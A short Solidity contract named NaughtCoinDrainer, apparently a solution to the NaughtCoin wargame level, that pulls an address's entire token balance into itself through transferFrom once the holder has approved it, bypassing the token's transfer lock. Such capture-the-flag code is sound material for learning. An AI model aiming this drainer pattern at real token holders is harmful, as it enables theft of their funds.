// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract NaughtCoinDrainer {
    function drainTokens(address token, address from) external {
        IERC20 naughtCoin = IERC20(token);
        uint256 balance = naughtCoin.balanceOf(from);
        require(balance > 0, "No tokens to drain");
        
        // The user must have already approved this contract
        bool success = naughtCoin.transferFrom(from, address(this), balance);
        require(success, "Transfer failed");
    }
    
    function getBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}